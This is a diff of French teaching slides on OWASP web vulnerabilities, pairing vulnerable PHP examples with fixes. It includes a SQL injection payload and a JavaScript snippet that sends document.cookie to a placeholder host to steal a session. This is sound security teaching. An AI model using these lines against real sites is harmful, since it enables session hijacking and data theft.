@@ -200,67 +200,92 @@ s'assurer une qualité continue du code
 
 ---
 
-### A1 - Injection
+### L'injection
 
 Risque d’injection SQL, Shell...
 
 ---
 
-### A2 - Violation de Gestion d’Authentification et de Session
+### La défaillance cryptographique
 
 Risque de casser / usurper une authentification ou une session. Comprends notamment le vol de session ou la récupération de mots de passe.
 
-⚠️ Un exemple ?
+- Données sensibles en claire.
+- Mots de passe en claire.
+- Mots de passe mal hachés.
 
 ---
 
-### A3 - Cross-Site Scripting (XSS)
+### Conception non sécurisée / Exposition de données sensibles
 
-Risque d'injection de contenu dans une page pour but de provoquer des actions non désirées dans celle-ci.
+Conception d'une application sans prise en compte de la sécurité. 
 
-Les failles XSS sont particulièrement répandues.
-
----
-
-### A4 - Références directes non sécurisées à un objet
-
-Accès à de la donnée en spécifiant un `id` directement par un paramètre non filtré.
+- Données en claire.
+- Manque de contrôle d'accès.
+- Manque de chiffrement (HTTPS). 
+- Manque de contôle de saisie.
+- Manque de contrôle de type (XSS, CSRF).
 
 ---
 
-### A5 - Mauvaise configuration Sécurité
+### Mauvaise configuration de la sécurité
 
-Corresponds aux failles de configuration liées aux serveurs Web, applications, base de données ou frameworks.
+Manque de validation des types de paramètres, accès trop facile aux ressources non accessibles au public (cloud), configuration incomplète ou trop permissive, messages d’erreurs trop détaillés.
 
----
-
-### A6 - Exposition de données sensibles
-
-Exposition de données sensibles comme les mots de passe, les numéros de carte de paiement ou encore les données personnelles et la nécessité de chiffrer ces données.
+- Accès à des ressources non publiques.
+- Messages d'erreurs trop détaillés.
+- Filtrage absent ou incomplet (filter_input, strip_tags, htmlspecialchars, htmlentities, etc.).
 
 ---
 
-### A7 - Manque de contrôle d’accès au niveau fonctionnel
-
-Failles liées aux contrôles d'accès de fonctionnalité.
-
----
-
-### A8 - Falsification de requête intersite (CSRF)
-
-Exécution de requêtes à l’insu de l’utilisateur (rejeu de requête, brute force…)
-
----
-
-### A9 - Utilisation de composants avec des vulnérabilités connues
+### Utilisation de composants avec des vulnérabilités connues
 
 Utilisation de composants tiers vulnérables.
 
+- CMS non à jour.
+- Librairies non à jour.
+- Apache non à jour.
+- PHP non à jour.
+- MySQL non à jour.
+
 ---
 
-### A10 - Redirections et Renvois Non Validés
+### Identification et authentification de mauvaise qualité
 
-Les redirections et les renvois non validés sont une vulnérabilité profitant d’une faiblesse dans le code et dont l’objectif est de rediriger l’utilisateur sur une page malveillante
+Applications n’exécutent pas de manière correcte les fonctions liées à la gestion des sessions ou à l’authentification des utilisateurs
+
+- Absence de double authentification.
+- Absence de règles de mots de passe (complexité, durée de vie, longueur, etc).
+- Mot de passe par défaut (admin/admin, root/root).
+- Utilisation d'id dans l'url (session hijacking).
+
+---
+
+### Manque d’intégrité des données et du logiciel
+
+Cette catégorie englobe les codes et infrastructures qui ne sont pas protégés contre les violations d’intégrité.
+
+- Absence de vérification de l'intégrité des données (validation d'une mise à jour).
+- Absence de vérification de l'intégrité du logiciel (signature, hashage, etc).
+- Rejeu de requêtes possibles (absence de CSRF).
+
+---
+
+### Absence de logs serveur et de surveillance
+
+Absence de logs serveur et de surveillance des activités de l’application.
+
+- Absence de logs serveur.
+- Absence de logs applicatifs.
+- Manque de supervision.
+
+---
+
+### Falsification de requête côté serveu
+
+Elle permet à un hacker d’inciter l’application côté serveur à envoyer des requêtes à un endroit non prévu. 
+
+Le serveur est donc capable de faire des requêtes à des endroits non prévus (depuis le coeur de l'application).
 
 ---
 
@@ -346,11 +371,13 @@ Quelle est la différence ?
 
 ---
 
-## Étape 1 : Le Code
+## Les failles
+
+OWASP donne la liste des grandes catégories de failles. Entrons dans le détail technique.
 
 ---
 
-### A1 - Injection
+### L'Injection
 
 ```sql
 SELECT * FROM client WHERE id='" . $_GET["id"] . "'
@@ -362,7 +389,17 @@ http://exemple.com/liste?id='or '1'='1
 
 ---
 
-### A2 - Violation de Gestion d’Authentification et de Session
+### Correction
+
+```php
+$stmt = $pdo->prepare("SELECT * FROM client WHERE id=?");
+$stmt->bindParam(1, $_GET["id"]);
+$stmt->execute();
+```
+
+---
+
+### Accès non autorisé à une session
 
 ```
 http://exemple.com/?jsessionid=A2938298D293
@@ -370,7 +407,18 @@ http://exemple.com/?jsessionid=A2938298D293
 
 ---
 
-### A3 - Cross-Site Scripting (XSS)
+Vol du cookie de session
+
+```javascript
+// Exemple de vol d'un cookie de session en JavaScript
+var img = new Image();
+img.src = "http://exemple.com/?jsessionid=" + document.cookie;
+document.body.appendChild(img);
+```
+
+---
+
+### Cross-Site Scripting (XSS)
 
 Exécution de code JavaScript sans validation.
 
@@ -384,7 +432,7 @@ Votre Nom : <input type="text" name="nom" value="" />
 ```
 
 ```js
-alert("Bonjour " + $_POST["nom"]);
+echo "Bonjour " . $_POST['nom'];
 ```
 
 ---
@@ -409,7 +457,23 @@ $stmt->bindParam(1, $mode);
 
 ---
 
-### A5 - Mauvaise configuration Sécurité
+- Toujours valider les entrées utilisateurs.
+- Toujours vérifier les droits de l'utilisateur.
+
+```php
+if ($_SESSION['mode'] == 'client') {
+    // On peut charger la ressource
+} else if ($_SESSION['mode'] == 'admin') {
+    // On peut charger la ressource
+} else {
+    // On ne peut pas charger la ressource
+}
+```
+
+
+---
+
+### Mauvaise configuration Sécurité
 
 - Console d’administration disponible sans authentification en ligne
 - Listage des répertoires ([Exemple](https://www.google.fr/search?dcr=0&q=intitle%3A%22Index%20of%22))
@@ -417,25 +481,49 @@ $stmt->bindParam(1, $mode);
 
 ---
 
-### A6 - Exposition de données sensibles
+### Exposition de données sensibles
 
-- Espace client / admin sans SSL
-- Mot de passe en claire (**ou en MD5**) dans la base de données
-- Sauvegarde de données inutiles
+- Espace client sans SSL.
+- Mot de passe en claire (**ou en MD5**) dans la base de données.
+- Sauvegarde de données inutiles.
+- Données sensibles dans les logs.
+- Données sensibles en claire dans la base de données.
 
 ---
 
-### A7 - Manque de contrôle d’accès au niveau fonctionnel
+- Utilisation de HTTPS (SSL/TLS).
+
+```php
+password_hash('admin', PASSWORD_DEFAULT);
+password_verify('admin', $hash);
+```
+
+---
+
+### Manque de contrôle d’accès au niveau fonctionnel
 
 - Page d’admin accessible avec un compte utilisateur
 - Mode non filtré (similaire à l’exemple mode={client,admin})
 
 ---
 
-### A8 - Falsification de requête intersite (CSRF)
+Condition d'accès dans le code
+
+```php
+if(SessionUtilisateur::estAdmin()) {
+    // On peut charger la ressource
+} else {
+    // On ne peut pas charger la ressource
+}
+```
+
+---
+
+### Falsification de requête intersite (CSRF)
 
 - Rejeu de requête déjà joué.
-- Brute force sur un formulaire.
+- Attaque de type brute force.
+- Execution de requête à l’insu de l’utilisateur (exemple : déconnexion / connexion sur un site tierce).
 
 ---
 
@@ -447,15 +535,32 @@ Ajouter un identifiant/jeton dans la requête, unique et non réutilisable
 
 ---
 
-### A9 - Utilisation de composants avec des vulnérabilités connues
+Ajouter un jeton unique dans les formulaires.
 
-- CMS non à jour
-- Apache non patchés
-- Librairies XYZ non à jour
+```php
+<input type="hidden" name="_token" value="{{ csrf_token() }}">
+
+// Côté PHP
+if (isset($_POST['_token']) && $_POST['_token'] == $_SESSION['_token']) {
+    // On peut traiter la requête
+} else {
+    die();
+}
+```
 
 ---
 
-### A10 - Redirections et Renvois Non Validés
+### Utilisation de composants avec des vulnérabilités connues
+
+- CMS non à jour.
+- Apache non patchés.
+- Librairies XYZ non à jour.
+- PHP non à jour.
+- MySQL non à jour.
+
+---
+
+### Redirections et Renvois Non Validés
 
 - Utilisation de votre site comme « masque » dans du phishing
 
